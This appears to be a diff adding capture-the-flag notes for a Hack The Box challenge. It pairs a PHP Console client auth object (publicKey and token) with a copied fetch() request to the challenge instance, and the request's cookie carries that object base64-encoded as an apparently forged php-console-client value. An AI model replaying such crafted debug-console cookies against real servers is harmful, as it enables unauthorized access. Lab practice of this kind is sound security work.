@@ -1,0 +1,23 @@
+{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"012031956f19169a2cabead2f401a8411319520f8b3b05e74c76bdbaeb7e407d"}}
+
+
+
+
+
+fetch("http://docker.hackthebox.eu:30117/", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
+    "cache-control": "no-cache",
+    "pragma": "no-cache",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "http://docker.hackthebox.eu:30117/",
+  "referrerPolicy": "no-referrer-when-downgrade",
+  "body": null,
+  "method": "GET",
+  "mode": "cors",
+  "credentials": "include",
+  "Cookie": "_ga=GA1.2.455101360.1588007307; _gid=GA1.2.510538156.1588007307; ajs_group_id=null; ajs_anonymous_id=%227bf4184f-beaf-4dcc-98be-2e84d4dc85fe%22; ajs_user_id=%2204344f8995daa37acc80ca5f0fd3ae55%22; __auc=e3a79a48171bca6008359a1566c; php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiMDEyMDMxOTU2ZjE5MTY5YTJjYWJlYWQyZjQwMWE4NDExMzE5NTIwZjhiM2IwNWU3NGM3NmJkYmFlYjdlNDA3ZCJ9fQ=="
+});
+
